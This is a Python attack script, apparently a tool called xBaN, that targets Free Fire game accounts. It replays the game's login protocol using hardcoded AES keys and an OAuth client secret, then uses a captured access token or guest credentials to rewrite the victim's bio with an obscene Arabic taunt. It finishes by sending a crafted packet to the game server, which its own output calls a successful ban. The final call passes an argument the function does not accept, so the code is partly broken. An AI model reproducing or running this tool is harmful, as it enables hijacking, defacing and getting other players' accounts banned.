import requests
import json
import base64
import socket
import logging
import sys
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import time
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("MaSrY_Lib")

import MajorLogin_res_pb2
import GetLoginData_res_pb2
import MajorLogin_pb2
from cachetools import TTLCache
from google.protobuf.timestamp_pb2 import Timestamp


FIXED_BIO = "FU4KED DONE -    تم النكَََحَ بنجاح\nBY xMaSrY_BoT\nهTG : @MASRY_PRIME_BOT"


OB_VERSION_CACHE = {"version": None, "timestamp": 0}

OB_VERSION_CACHE_TTL = 3600 
 
def get_ob_version():
    global OB_VERSION_CACHE
    now = time.time()
    if OB_VERSION_CACHE["version"] and (now - OB_VERSION_CACHE["timestamp"]) < OB_VERSION_CACHE_TTL:
        return OB_VERSION_CACHE["version"]

    try:
        url = "https://version.ggwhitehawk.com//live/ver.php?version=1.3.0&lang=ar&device=android&channel=android&appstore=googleplay&region=ME&whitelist_version=1.3.0&whitelist_sp_version=1.0.0&device_name=google%20G011A&device_CPU=ARMv7%20VFPv3%20NEON%20VMH&device_GPU=Adreno%20(TM)%20640&device_mem=1993"
        resp = requests.get(url, timeout=10)
        data = resp.json()
        ob = data.get("latest_release_version")
        if ob:
            OB_VERSION_CACHE["version"] = ob
            OB_VERSION_CACHE["timestamp"] = now
            return ob
    except Exception as e:
        print(f"[ERROR] Failed to fetch OB version: {e}")

    return "ob"

class SimpleProtobuf:
    @staticmethod
    def encode_varint(value):
        result = bytearray()
        while value > 0x7F:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)

    @staticmethod
    def decode_varint(data, start_index=0):
        value = 0
        shift = 0
        index = start_index
        while index < len(data):
            byte = data[index]
            index += 1
            value |= (byte & 0x7F) << shift
            if not (byte & 0x80):
                break
            shift += 7
        return value, index

    @staticmethod
    def parse_protobuf(data):
        result = {}
        index = 0
        while index < len(data):
            if index >= len(data):
                break
            tag = data[index]
            field_num = tag >> 3
            wire_type = tag & 0x07
            index += 1
            if wire_type == 0:
                value, index = SimpleProtobuf.decode_varint(data, index)
                result[field_num] = value
            elif wire_type == 2:
                length, index = SimpleProtobuf.decode_varint(data, index)
                if index + length <= len(data):
                    value_bytes = data[index:index + length]
                    index += length
                    try:
                        result[field_num] = value_bytes.decode('utf-8')
                    except:
                        result[field_num] = value_bytes
            else:
                break
        return result

    @staticmethod
    def encode_string(field_number, value):
        if isinstance(value, str):
            value = value.encode('utf-8')
        result = bytearray()
        result.extend(SimpleProtobuf.encode_varint((field_number << 3) | 2))
        result.extend(SimpleProtobuf.encode_varint(len(value)))
        result.extend(value)
        return bytes(result)

    @staticmethod
    def encode_int32(field_number, value):
        result = bytearray()
        result.extend(SimpleProtobuf.encode_varint((field_number << 3) | 0))
        result.extend(SimpleProtobuf.encode_varint(value))
        return bytes(result)

    @staticmethod
    def create_login_payload(open_id, access_token, platform):
        payload = bytearray()
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        payload.extend(SimpleProtobuf.encode_string(3, current_time))
        payload.extend(SimpleProtobuf.encode_string(4, 'free fire'))
        payload.extend(SimpleProtobuf.encode_int32(5, 1))
        payload.extend(SimpleProtobuf.encode_string(7, '1.120.1'))
        payload.extend(SimpleProtobuf.encode_string(8, 'Android OS 12 / API-31 (SP1A.210812.016/T505NDXS6CXB1)'))
        payload.extend(SimpleProtobuf.encode_string(9, 'Handheld'))
        payload.extend(SimpleProtobuf.encode_string(10, 'we'))
        payload.extend(SimpleProtobuf.encode_string(11, 'WIFI'))
        payload.extend(SimpleProtobuf.encode_int32(12, 1334))
        payload.extend(SimpleProtobuf.encode_int32(13, 800))
        payload.extend(SimpleProtobuf.encode_string(14, '225'))
        payload.extend(SimpleProtobuf.encode_string(15, 'ARM64 FP ASIMD AES | 4032 | 8'))
        payload.extend(SimpleProtobuf.encode_int32(16, 2705))
        payload.extend(SimpleProtobuf.encode_string(17, 'Adreno (TM) 610'))
        payload.extend(SimpleProtobuf.encode_string(18, 'OpenGL ES 3.2 V@0502.0 (GIT@5eaa426211, I07ee46fc66, 1633700387) (Date:10/08/21)'))
        payload.extend(SimpleProtobuf.encode_string(19, 'Google|dbc5b426-9715-454a-9466-6c82e151d407'))
        payload.extend(SimpleProtobuf.encode_string(20, '154.183.6.12'))
        payload.extend(SimpleProtobuf.encode_string(21, 'ar'))
        payload.extend(SimpleProtobuf.encode_string(22, open_id))
        payload.extend(SimpleProtobuf.encode_string(23, str(platform)))
        payload.extend(SimpleProtobuf.encode_string(24, 'Handheld'))
        payload.extend(SimpleProtobuf.encode_string(25, 'samsung SM-T505N'))
        payload.extend(SimpleProtobuf.encode_string(29, access_token))
        payload.extend(SimpleProtobuf.encode_int32(30, 1))
        payload.extend(SimpleProtobuf.encode_string(41, 'we'))
        payload.extend(SimpleProtobuf.encode_string(42, 'WIFI'))
        payload.extend(SimpleProtobuf.encode_string(57, 'e89b158e4bcf988ebd09eb83f5378e87'))
        payload.extend(SimpleProtobuf.encode_int32(60, 22394))
        payload.extend(SimpleProtobuf.encode_int32(61, 1424))
        payload.extend(SimpleProtobuf.encode_int32(62, 3349))
        payload.extend(SimpleProtobuf.encode_int32(63, 24))
        payload.extend(SimpleProtobuf.encode_int32(64, 1552))
        payload.extend(SimpleProtobuf.encode_int32(65, 22394))
        payload.extend(SimpleProtobuf.encode_int32(66, 1552))
        payload.extend(SimpleProtobuf.encode_int32(67, 22394))
        payload.extend(SimpleProtobuf.encode_int32(73, 1))
        payload.extend(SimpleProtobuf.encode_string(74, '/data/app/~~GAY==/com.dts.zbiiiiiiiiiiiiiiiiiiiio==/arm64'))
        payload.extend(SimpleProtobuf.encode_int32(76, 2))
        payload.extend(SimpleProtobuf.encode_string(77, 'b4d2689433917e66100ba91db790bf37|/data/app/~~GAY==/com.dts.zbiiiiiiiiiiiiiiiiiiiio==/zbi.apk'))
        payload.extend(SimpleProtobuf.encode_int32(78, 2))
        payload.extend(SimpleProtobuf.encode_int32(79, 2))
        payload.extend(SimpleProtobuf.encode_string(81, '64'))
        payload.extend(SimpleProtobuf.encode_string(83, '2019115296'))
        payload.extend(SimpleProtobuf.encode_int32(85, 1))
        payload.extend(SimpleProtobuf.encode_string(86, 'OpenGLES3'))
        payload.extend(SimpleProtobuf.encode_int32(87, 16383))
        payload.extend(SimpleProtobuf.encode_int32(88, 4))
        payload.extend(SimpleProtobuf.encode_string(90, 'Damanhur'))
        payload.extend(SimpleProtobuf.encode_string(91, 'BH'))
        payload.extend(SimpleProtobuf.encode_int32(92, 31095))
        payload.extend(SimpleProtobuf.encode_string(93, 'android_max'))
        payload.extend(SimpleProtobuf.encode_string(94, 'KqsHTzpfADfqKnEg/KMctJLElsm8bN2M4ts0zq+ifY+560USyjMSDL386RFrwRloT0ZSbMxEuM+Y4FSvjghQQZXWWpY='))
        payload.extend(SimpleProtobuf.encode_int32(97, 1))
        payload.extend(SimpleProtobuf.encode_int32(98, 1))
        payload.extend(SimpleProtobuf.encode_string(99, str(platform)))
        payload.extend(SimpleProtobuf.encode_string(100, str(platform)))
        inner = SimpleProtobuf.encode_string(8, 'GAW')
        payload.extend(SimpleProtobuf.encode_string(102, inner.decode('latin1')))
        return bytes(payload)

def b64url_decode(input_str: str) -> bytes:
    rem = len(input_str) % 4
    if rem:
        input_str += '=' * (4 - rem)
    return base64.urlsafe_b64decode(input_str)

def get_available_room(input_text):
    try:
        data = bytes.fromhex(input_text)
        result = {}
        index = 0
        while index < len(data):
            if index >= len(data):
                break
            tag = data[index]
            field_num = tag >> 3
            wire_type = tag & 0x07
            index += 1
            if wire_type == 0:
                value = 0
                shift = 0
                while index < len(data):
                    byte = data[index]
                    index += 1
                    value |= (byte & 0x7F) << shift
                    if not (byte & 0x80):
                        break
                    shift += 7
                result[str(field_num)] = {"wire_type": "varint", "data": value}
            elif wire_type == 2:
                length = 0
                shift = 0
                while index < len(data):
                    byte = data[index]
                    index += 1
                    length |= (byte & 0x7F) << shift
                    if not (byte & 0x80):
                        break
                    shift += 7
                if index + length <= len(data):
                    value_bytes = data[index:index + length]
                    index += length
                    try:
                        value_str = value_bytes.decode('utf-8')
                        result[str(field_num)] = {"wire_type": "string", "data": value_str}
                    except:
                        result[str(field_num)] = {"wire_type": "bytes", "data": value_bytes.hex()}
            else:
                break
        return json.dumps(result)
    except Exception as e:
        logger.error(f"[!] Error parsing protobuf: {e}")
        return None

def extract_jwt_payload_dict(jwt_s: str):
    try:
        parts = jwt_s.split('.')
        if len(parts) < 2:
            return None
        payload_b64 = parts[1]
        payload_bytes = b64url_decode(payload_b64)
        payload = json.loads(payload_bytes.decode('utf-8', errors='ignore'))
        if isinstance(payload, dict):
            return payload
    except Exception as e:
        logger.error(f"[!] Error extracting JWT payload: {e}")
    return None

def encrypt_packet(hex_string: str, aes_key, aes_iv) -> str:
    if isinstance(aes_key, str):
        aes_key = bytes.fromhex(aes_key)
    if isinstance(aes_iv, str):
        aes_iv = bytes.fromhex(aes_iv)
    data = bytes.fromhex(hex_string)
    cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
    encrypted = cipher.encrypt(pad(data, AES.block_size))
    return encrypted.hex()

def build_start_packet(account_id: int, timestamp: int, jwt: str, key, iv) -> str:
    try:
        encrypted = encrypt_packet(jwt.encode().hex(), key, iv)
        head_len = hex(len(encrypted) // 2)[2:]
        ide_hex = hex(int(account_id))[2:]
        zeros = "0" * (16 - len(ide_hex))
        timestamp_hex = hex(timestamp)[2:].zfill(2)
        head = f"0115{zeros}{ide_hex}{timestamp_hex}00000{head_len}"
        start_packet = head + encrypted
        return start_packet
    except Exception as e:
        logger.error(f"[!] Error building start packet: {e}")
        return None

def send_once(remote_ip, remote_port, payload_bytes, recv_timeout=3.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(recv_timeout)
    try:
        s.connect((remote_ip, remote_port))
        s.sendall(payload_bytes)
        chunks = []
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
        except socket.timeout:
            pass
        return b"".join(chunks)
    finally:
        s.close()

def change_bio(jwt_token, new_bio):
    if len(new_bio) > 180:
        return False
    bio_key = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
    bio_iv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
    payload = bytearray()
    payload.extend(SimpleProtobuf.encode_int32(2, 17))
    payload.extend(SimpleProtobuf.encode_string(5, b''))
    payload.extend(SimpleProtobuf.encode_string(6, b''))
    payload.extend(SimpleProtobuf.encode_string(8, new_bio))
    payload.extend(SimpleProtobuf.encode_int32(9, 1))
    payload.extend(SimpleProtobuf.encode_string(11, b''))
    payload.extend(SimpleProtobuf.encode_string(12, b''))
    padded = pad(bytes(payload), AES.block_size)
    cipher = AES.new(bio_key, AES.MODE_CBC, bio_iv)
    encrypted = cipher.encrypt(padded)
    headers = {
        "Expect": "100-continue",
        "Authorization": f"Bearer {jwt_token}",
        "X-Unity-Version": "2018.4.11f1",
        "X-GA": "v1 1",
        "ReleaseVersion": get_ob_version(),
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A305F Build/RP1A.200720.012)",
        "Host": "clientbp.ggblueshark.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    try:
        resp = requests.post("https://clientbp.ggpolarbear.com/UpdateSocialBasicInfo",
                             headers=headers, data=encrypted, timeout=10)
        return resp.status_code == 200
    except:
        return False

def process_ban_request(access_token):
    try:
        
        inspect_url = f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}"
        inspect_headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "close",
            "Content-Type": "application/x-www-form-urlencoded",
            "Host": "100067.connect.garena.com",
            "User-Agent": "GarenaMSDK/4.0.19P4(G011A ;Android 9;en;US;)"
        }
        
        resp = requests.get(inspect_url, headers=inspect_headers, timeout=10)
        data = resp.json()
        
        if 'error' in data:
            return {"status": "error", "message": f"Token error: {data.get('error')}"}
        
        NEW_OPEN_ID = data.get('open_id')
        platform_ = data.get('platform')
       
        key = b'Yg&tc%DEuh6%Zc^8'
        iv = b'6oyZDr22E3ychjM%'
        MajorLogin_url = "https://loginbp.ggblueshark.com/MajorLogin"
        MajorLogin_headers = {
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-S908E Build/TP1A.220624.014)",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/octet-stream",
            "Expect": "100-continue",
            "X-GA": "v1 1",
            "X-Unity-Version": "2018.4.11f1",
            "ReleaseVersion": get_ob_version()
        }
        
        data_pb = SimpleProtobuf.create_login_payload(NEW_OPEN_ID, access_token, str(platform_))
        data_padded = pad(data_pb, 16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        enc_data = cipher.encrypt(data_padded)
        
        response = requests.post(MajorLogin_url, headers=MajorLogin_headers, data=enc_data, timeout=15)
        
        if not response.ok:
            return {"status": "error", "message": f"MajorLogin returned error code: {response.status_code}"}
        
        resp_enc = response.content
        cipher_resp = AES.new(key, AES.MODE_CBC, iv)
        resp_msg = MajorLogin_res_pb2.MajorLoginRes()
        
        try:
            resp_dec = unpad(cipher_resp.decrypt(resp_enc), 16)
            resp_msg.ParseFromString(resp_dec)
            parsed_data = SimpleProtobuf.parse_protobuf(resp_dec)
        except Exception:
            resp_msg.ParseFromString(resp_enc)
            parsed_data = SimpleProtobuf.parse_protobuf(resp_enc)
        

        if not change_bio(resp_msg.account_jwt, FIXED_BIO):
            return {"status": "error", "message": "Failed to change bio before ban"}
       
        field_21_value = parsed_data.get(21, None)
        if field_21_value:
            ts = Timestamp()
            ts.FromNanoseconds(field_21_value)
            timetamp = ts.seconds * 1_000_000_000 + ts.nanos
        else:
            payload = extract_jwt_payload_dict(resp_msg.account_jwt)
            exp = int(payload.get("exp", 0))
            ts = Timestamp()
            ts.FromNanoseconds(exp * 1_000_000_000)
            timetamp = ts.seconds * 1_000_000_000 + ts.nanos
        
        GetLoginData_resURL = "https://clientbp.ggpolarbear.com/GetLoginData"
        GetLoginData_res_headers = {
            'Expect': '100-continue',
            'Authorization': f'Bearer {resp_msg.account_jwt}',
            'X-Unity-Version': '2018.4.11f1',
            'X-GA': 'v1 1',
            'ReleaseVersion': get_ob_version(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)',
            'Host': 'clientbp.ggpolarbear.com',
            'Connection': 'close',
            'Accept-Encoding': 'gzip, deflate, br',
        }
        
        r2 = requests.post(GetLoginData_resURL, headers=GetLoginData_res_headers, data=enc_data, timeout=12, verify=False)
        
        online_ip = None
        online_port = None
        if r2.status_code == 200:
            x = r2.content.hex()
            json_result = get_available_room(x)
            
            if json_result:
                parsed_data_login = json.loads(json_result)
                
                if '14' in parsed_data_login and 'data' in parsed_data_login['14']:
                    online_address = parsed_data_login['14']['data']
                    online_ip = online_address[:len(online_address) - 6]
                    online_port = int(online_address[len(online_address) - 5:])
                    
                else:
                    return {"status": "error", "message": "Could not find field 14 in parsed data"}
            else:
                return {"status": "error", "message": "Failed to parse GetLoginData response"}
        else:
            return {"status": "error", "message": f"GetLoginData returned error: {r2.status_code}"}
        
        
        payload_jwt = extract_jwt_payload_dict(resp_msg.account_jwt)
        if payload_jwt is None:
            return {"status": "error", "message": "Failed to decode JWT payload"}
        
        account_id = int(payload_jwt.get("account_id", 0))
        final_token_hex = build_start_packet(
            account_id=account_id,
            timestamp=timetamp,
            jwt=resp_msg.account_jwt,
            key=resp_msg.key,
            iv=resp_msg.iv)
        
        if not final_token_hex:
            return {"status": "error", "message": "Failed to build start packet"}
        
        
        payload_bytes = bytes.fromhex(final_token_hex)
        
        response = send_once(online_ip, online_port, payload_bytes, recv_timeout=5.0)
        
        if response:
            
            return {
                "status": "success",
                "message": "Ban completed successfully after bio change",
                "account_id": str(account_id),
                "open_id": NEW_OPEN_ID,
                "platform": platform_,
                "response_size": len(response)
            }
        else:
            
            return {"status": "partial", "message": "Sent packet but no response received"}
            
    except requests.exceptions.RequestException as e:
        logger.error(f"[!] Network error: {e}")
        return {"status": "error", "message": f"Network error: {str(e)}"}
    except Exception as e:
        logger.error(f"[!] Unexpected error: {e}")
        return {"status": "error", "message": f"Unexpected error: {str(e)}"}


def get_token(uid, password):
    url = "https://100067.connect.garena.com/oauth/guest/token/grant"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P8(Android 12)",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "uid": uid,
        "password": password,
        "response_type": "token",
        "client_type": "2",
        "client_id": "100067",
        "client_secret": "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3",
    }
    try:
        r = requests.post(url, headers=headers, data=data, timeout=15)
    except Exception as e:
        return {"error": "REQUEST_FAILED", "details": str(e)}
    if r.status_code != 200:
        return {"error": "HTTP_ERROR", "status": r.status_code, "body": r.text}
    try:
        return r.json()
    except Exception:
        return {"error": "INVALID_JSON", "body": r.text}


if __name__ == "__main__":


    if len(sys.argv) == 2:

        access_token = sys.argv[1]
        print("[*] تم استلام Access Token مباشرة.")
    elif len(sys.argv) == 3:
        uid = sys.argv[1]
        password = sys.argv[2]
        print("[*] جاري جلب التوكن من UID/PW...")
        token_response = get_token(uid, password)
        if "error" in token_response:
            print(f"[!] فشل جلب التوكن: {token_response}")
            sys.exit(1)
        access_token = token_response.get("access_token")
        if not access_token:
            print("[!] لم يتم العثور على access_token في الرد:")
            print(json.dumps(token_response, indent=2, ensure_ascii=False))
            sys.exit(1)
        print(f"[*] تم جلب التوكن بنجاح: {access_token[:15]}...")
    else:
        print("الاستخدام:")
        print("  1. باستخدام Access Token مباشر:")
        print("     python xBaN.py <ACCESS_TOKEN>")
        print("  2. باستخدام UID و Password:")
        print("     python xBaN.py <UID> <PASSWORD>")
        sys.exit(1)

    print(f"[*] جاري بدء عملية الحظر مع بايو ثابت: {FIXED_BIO}")
    result = process_ban_request(access_token, bio_text=FIXED_BIO)
    print(json.dumps(result, indent=4, ensure_ascii=False))